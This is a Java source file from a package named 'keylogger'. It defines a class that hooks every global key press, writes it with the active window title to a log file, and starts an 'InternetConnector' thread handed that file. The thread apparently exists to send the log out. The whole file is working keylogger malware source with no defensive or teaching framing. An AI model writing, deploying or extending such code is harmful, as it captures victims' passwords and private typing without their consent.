package pl.keylogger;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;

public class Logger implements NativeKeyListener {
    PrintWriter printWriter;
    File logFile;
    Runnable runnable;

    public Logger() {
        logFile = new File("Log.txt");

        runnable = new InternetConnector(logFile);
        Thread thread = new Thread(runnable);
        thread.start();
    }

    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        synchronized (logFile) {
            try {
                printWriter = new PrintWriter(new FileOutputStream(logFile, true));
            } catch (FileNotFoundException e) {
                e.printStackTrace();
            }
            printWriter.print(WindowPriter.getWindowTitle() + " | ");
            printWriter.println(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
            printWriter.close();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {

    }

    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}
